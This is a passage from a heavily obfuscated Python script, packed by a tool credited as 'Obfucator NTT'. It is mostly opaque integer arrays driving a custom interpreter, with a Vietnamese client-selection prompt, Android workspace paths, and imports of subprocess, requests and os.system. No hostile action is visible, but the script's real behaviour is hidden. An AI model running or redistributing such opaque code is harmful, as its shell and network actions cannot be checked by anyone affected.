190, 9, 190, 10, 29, 84, 125, 35, 190, 11, 10, 254, 10, 240, 190, 7, 10, 83, 190, 12, 10, 21, 202, 24, 190, 9, 10, 97, 253, 9, 29, 182, 247, 2, 202, 88, 92, 1, 190, 2, 89, 3, 130, 6, 190, 13, 202, 232, 233, 0, 190, 14, 190, 15, 190, 16, 190, 17, 190, 16, 190, 18, 10, 38, 190, 16, 190, 19, 190, 14, 253, 9, 125, 39, 247, 2, 92, 1, 190, 2, 89, 3, 130, 6, 190, 20, 233, 0, 190, 21, 190, 22, 190, 23, 190, 24, 190, 21, 190, 21, 10, 142, 190, 25, 190, 26, 190, 23, 202, 189, 190, 27, 190, 27, 10, 217, 29, 238, 253, 11, 202, 118, 247, 2, 29, 81, 125, 151, 92, 1, 29, 6, 202, 158, 190, 2, 89, 3, 130, 6, 125, 213, 29, 69, 190, 28, 233, 0, 29, 171, 190, 29, 190, 8, 202, 226, 10, 190, 190, 30, 190, 9, 190, 8, 190, 29, 190, 31, 10, 139, 190, 10, 190, 30, 190, 10, 190, 8, 253, 11, 247, 2, 92, 1, 253, 4, 35, 7, 130, 8, 190, 2, 202, 104, 89, 3, 130, 6, 190, 32, 233, 0, 29, 177, 190, 33, 125, 56, 202, 37, 190, 34, 190, 35, 190, 36, 190, 37, 202, 106, 202, 224, 190, 38, 29, 129, 190, 39, 125, 232, 190, 40, 190, 37, 190, 38, 125, 212, 125, 181, 190, 41, 125, 46, 10, 21, 190, 42, 29, 42, 10, 11, 190, 37, 190, 43, 29, 115, 29, 154, 190, 34, 190, 44, 190, 45, 190, 40, 29, 108, 190, 37, 190, 46, 190, 37, 29, 86, 202, 136, 253, 21, 125, 237, 247, 2, 125, 27, 29, 79, 92, 1, 247, 1, 10, 2, 35, 9, 125, 43, 202, 188, 190, 47, 233, 0, 247, 0, 35, 10, 29, 131, 190, 48, 233, 0, 247, 0, 35, 11, 190, 49, 35, 0, 184, 213, 130, 0, 202, 53, 190, 49, 59, 0, 202, 151, 232, 213, 190, 50, 232, 211, 130, 12, 190, 51, 233, 0, 247, 0, 247, 1, 35, 13, 130, 13, 125, 41, 202, 238, 232, 188, 130, 14, 10, 12, 125, 118, 247, 0, 111, 0, 125, 55, 130, 15, 89, 52, 190, 36, 92, 1, 111, 0, 130, 16, 89, 53, 10, 12, 10, 209, 130, 7, 29, 129, 92, 1, 35, 17, 130, 18, 29, 212, 190, 54, 202, 130, 10, 246, 247, 1, 29, 58, 29, 102, 160, 0, 10, 192, 125, 79, 246, 188, 10, 220, 35, 19, 29, 150, 125, 99, 130, 20, 130, 17, 247, 1, 29, 149, 10, 186, 111, 0, 125, 116, 130, 15, 202, 189, 202, 232, 89, 52, 190, 55, 29, 241, 10, 181, 92, 1, 202, 238, 111, 0, 184, 176, 130, 15, 89, 52, 190, 56, 92, 1, 111, 0, 130, 21, 10, 44, 202, 252, 89, 57, 29, 190, 190, 2, 202, 73, 89, 3, 130, 6, 190, 58, 233, 0, 29, 205, 190, 59, 125, 97, 125, 93, 190, 60, 190, 61, 190, 62, 202, 174, 29, 23, 190, 8, 29, 46, 202, 131, 253, 5, 247, 2, 92, 1, 92, 1, 111, 0, 184, 149, 190, 1, 202, 131, 125, 12, 35, 0, 125, 247, 184, 2, 125, 158, 165, 0], 'NbmLvVPl_QHrSn5Af': [129, 210, '', 'join', '\nBạn đã chọn Client: ', '\n', {'FiVJWYRM_pd7ECLXv': 1, 'JOBBqkVE_F1wTWDhK': [130, 0, 202, 98, 125, 222, 80, 0, 190, 0, 199, 0, 247, 1, 149, 0], 'NbmLvVPl_QHrSn5Af': [66], 'FcvQsFUf_U4XrAs9K': ['chr'], 'fhuctOnk_99WtMbd3': ['_x'], 'vFxTVMiL_6e4QqeX7': []}, 116, 112, 118, 115, 117, 122, {'FiVJWYRM_pd7ECLXv': 1, 'JOBBqkVE_F1wTWDhK': [130, 0, 80, 0, 29, 82, 190, 0, 199, 0, 247, 1, 149, 0], 'NbmLvVPl_QHrSn5Af': [96], 'FcvQsFUf_U4XrAs9K': ['chr'], 'fhuctOnk_99WtMbd3': ['_x'], 'vFxTVMiL_6e4QqeX7': []}, 81, 84, 82, 88, 83, 89, {'FiVJWYRM_pd7ECLXv': 1, 'JOBBqkVE_F1wTWDhK': [202, 220, 29, 242, 130, 0, 202, 207, 80, 0, 29, 112, 125, 249, 190, 0, 125, 2, 199, 0, 10, 98, 202, 76, 247, 1, 149, 0], 'NbmLvVPl_QHrSn5Af': [116], 'FcvQsFUf_U4XrAs9K': ['chr'], 'fhuctOnk_99WtMbd3': ['_x'], 'vFxTVMiL_6e4QqeX7': []}, 69, 76, 77, 68, 66, 65, 70, {'FiVJWYRM_pd7ECLXv': 1, 'JOBBqkVE_F1wTWDhK': [130, 0, 125, 81, 29, 212, 80, 0, 190, 0, 199, 0, 202, 155, 247, 1, 202, 39, 149, 0], 'NbmLvVPl_QHrSn5Af': [64], 'FcvQsFUf_U4XrAs9K': ['chr'], 'fhuctOnk_99WtMbd3': ['_x'], 'vFxTVMiL_6e4QqeX7': []}, 113, 114, 121, {'FiVJWYRM_pd7ECLXv': 1, 'JOBBqkVE_F1wTWDhK': [202, 240, 130, 0, 80, 0, 190, 0, 199, 0, 10, 204, 247, 1, 29, 81, 202, 60, 149, 0], 'NbmLvVPl_QHrSn5Af': [117], 'FcvQsFUf_U4XrAs9K': ['chr'], 'fhuctOnk_99WtMbd3': ['_x'], 'vFxTVMiL_6e4QqeX7': []}, 59, 29, 7896, 5, 85, 1, 159, 27, 149, 28, 30, 26, 7894, 79, {'FiVJWYRM_pd7ECLXv': 1, 'JOBBqkVE_F1wTWDhK': [29, 112, 29, 224, 253, 0, 35, 0, 130, 1, 89, 0, 190, 1, 125, 163, 89, 2, 130, 2, 125, 62, 190, 3, 233, 0, 29, 42, 125, 138, 190, 4, 253, 1, 247, 2, 92, 1, 92, 1, 125, 209, 160, 0, 246, 30, 35, 3, 29, 47, 130, 3, 89, 5, 92, 0, 232, 29, 29, 27, 130, 0, 89, 6, 29, 187, 130, 3, 202, 70, 10, 54, 89, 5, 10, 166, 125, 129, 92, 0, 92, 1, 202, 164, 202, 15, 111, 0, 184, 15, 184, 15, 10, 59, 130, 0, 149, 0], 'NbmLvVPl_QHrSn5Af': ['split', '', 'join', {'FiVJWYRM_pd7ECLXv': 1, 'JOBBqkVE_F1wTWDhK': [130, 0, 80, 0, 190, 0, 199, 0, 10, 88, 10, 163, 247, 1, 149, 0], 'NbmLvVPl_QHrSn5Af': [6], 'FcvQsFUf_U4XrAs9K': ['chr'], 'fhuctOnk_99WtMbd3': ['_x'], 'vFxTVMiL_6e4QqeX7': []}, 42, 'strip', 'append'], 'FcvQsFUf_U4XrAs9K': ['__cr', 'aYwpejjY_HHZeJZke', 'map', 'uiPbcyVi_KOCZXUEi'], 'fhuctOnk_99WtMbd3': [], 'vFxTVMiL_6e4QqeX7': []}, {'FiVJWYRM_pd7ECLXv': 1, 'JOBBqkVE_F1wTWDhK': [29, 19, 125, 75, 253, 0, 35, 0, 130, 1, 160, 0, 10, 47, 246, 24, 35, 2, 29, 229, 29, 110, 130, 0, 89, 0, 190, 1, 89, 2, 190, 3, 130, 3, 130, 4, 202, 102, 29, 96, 247, 1, 190, 4, 125, 225, 125, 156, 130, 3, 130, 2, 247, 1, 190, 5, 125, 138, 253, 5, 10, 94, 92, 1, 92, 1, 111, 0, 125, 36, 125, 231, 184, 4, 130, 0, 149, 0], 'NbmLvVPl_QHrSn5Af': ['append', '', 'join', '/storage/emulated/0/', '/Workspace/rj/', '/Time.json'], 'FcvQsFUf_U4XrAs9K': ['__cr', 'LuIWYVLl_RwkXtPD5', 'jEqqYzhg_ybnqwqRO', 'str', 'OhxzQCnh_Non9JTlT'], 'fhuctOnk_99WtMbd3': [], 'vFxTVMiL_6e4QqeX7': []}, 23, True, {'FiVJWYRM_pd7ECLXv': 1, 'JOBBqkVE_F1wTWDhK': [253, 0, 35, 0, 130, 1, 29, 75, 160, 0, 246, 14, 35, 2, 29, 216, 130, 0, 29, 67, 89, 0, 130, 3, 130, 2, 247, 1, 92, 1, 10, 14, 10, 231, 111, 0, 10, 21, 125, 213, 184, 4, 202, 187, 10, 118, 130, 0, 10, 163, 149, 0], 'NbmLvVPl_QHrSn5Af': ['append'], 'FcvQsFUf_U4XrAs9K': ['__cr', 'ucrKBwMi_lSdKNoBI', 'LIQenDDD_sLxg4HGu', 'PMXXZiIT_Tjm4CkHK'], 'fhuctOnk_99WtMbd3': [], 'vFxTVMiL_6e4QqeX7': []}, 'sleep', 'choice', 6, 0.1, 60, 'system', {'FiVJWYRM_pd7ECLXv': 1, 'JOBBqkVE_F1wTWDhK': [130, 0, 80, 0, 10, 46, 190, 0, 199, 0, 247, 1, 149, 0], 'NbmLvVPl_QHrSn5Af': [2], 'FcvQsFUf_U4XrAs9K': ['chr'], 'fhuctOnk_99WtMbd3': ['_x'], 'vFxTVMiL_6e4QqeX7': []}, 97, 110, 103, 99], 'FcvQsFUf_U4XrAs9K': ['kKlZVpQn_EqjR378m', 'qEUAMadB_1YRWrNqh', 'BMfRhEYf_oOQcrd9J', 'OhxzQCnh_Non9JTlT', 'print', 'str', 'map', 'VqWhjXLY_9IG6BXgp', 'input', 'aYwpejjY_HHZeJZke', 'LuIWYVLl_RwkXtPD5', 'ucrKBwMi_lSdKNoBI', 'any', 'EbuTghNM_Teeq9dpK', 'vImBeJym_MJ4w1oXp', 'time', 'random', 'akAjdJoA_lyucXKLg', 'range', 'PxmWiNqt_4p8KdQaR', 'vGLFefwY_OqKyoZEP', 'os'], 'fhuctOnk_99WtMbd3': [], 'vFxTVMiL_6e4QqeX7': []}, {'FiVJWYRM_pd7ECLXv': 1, 'JOBBqkVE_F1wTWDhK': [10, 125, 130, 0, 80, 0, 190, 0, 125, 73, 199, 0, 247, 1, 149, 0], 'NbmLvVPl_QHrSn5Af': [93], 'FcvQsFUf_U4XrAs9K': ['chr'], 'fhuctOnk_99WtMbd3': ['_x'], 'vFxTVMiL_6e4QqeX7': []}, 2, 52], 'FcvQsFUf_U4XrAs9K': ['os', 'time', 'random', 'json', 'hashlib', 'subprocess', 'requests', 'map', 'xxeJNQAy_Luz2m7L2', 'TVLQcftB_gWMXx7wE', 'SEDsaGYM_jXRfBvRw', 'GALnZkXq_TF8BWmKt', 'cqeyTKeO_EIO5scZ0', 'qEUAMadB_1YRWrNqh', 'BMfRhEYf_oOQcrd9J', 'lyVHsuav_kRoCOnsk', 'vImBeJym_MJ4w1oXp', 'iVbjOCPF_aEawyRGV', 'vGLFefwY_OqKyoZEP', 'PMXXZiIT_Tjm4CkHK', 'dvUxkYWV_hvloqIZK', '__name__'], 'fhuctOnk_99WtMbd3': [], 'vFxTVMiL_6e4QqeX7': []}, {'__name__': '__main__'}, '__STACK_RUNNER__'], 'renv_idx': 1, 'rfn_idx': 2}
+DsyaXFwS_WvDWEcUO["rco"][1]={'__name__':'__main__','Obfucator NTT - https://discord.gg/YAdrT39SWq':dowqWJuf_88BdThQY}
+hRUtfbaA_SLfmQBKN=EMhxuTyw_nVlYBpBc(aPilEqkQ_zpwe8Aa6,SEXDFJtH_U9aJOqEL)
+hRUtfbaA_SLfmQBKN(DsyaXFwS_WvDWEcUO)
